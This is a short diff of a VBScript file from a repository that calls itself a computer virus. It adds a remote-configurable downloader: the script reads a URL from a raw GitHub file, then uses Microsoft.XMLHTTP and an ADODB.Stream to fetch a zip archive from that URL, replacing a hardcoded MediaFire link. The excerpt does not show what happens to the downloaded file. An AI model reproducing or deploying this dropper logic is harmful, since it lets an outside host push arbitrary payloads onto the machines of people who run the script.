@@ -10,9 +10,15 @@ If Not fso.FolderExists(docFold) Then
 End If
 
 
+Set objXMLHTTP = CreateObject("MSXML2.XMLHTTP")
+objXMLHTTP.open "GET", "https://raw.githubusercontent.com/stranck/WeAreNumberOneButItIsAComputerVirus/master/online/dwn", false
+    objXMLHTTP.send()
+
+dwnn = objXMLHTTP.responseText
+
 dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
 dim bStrm: Set bStrm = createobject("Adodb.Stream")
-xHttp.Open "GET", "http://download891.mediafire.com/112656f66qjg/tz4zxpq98bz0z43/zip.zip", False
+xHttp.Open "GET", dwnn, False
 xHttp.Send 'http://download944.mediafire.com/0yv4p03rjhcg/pbhsqz8mtn0n305/test.zip
 
 with bStrm
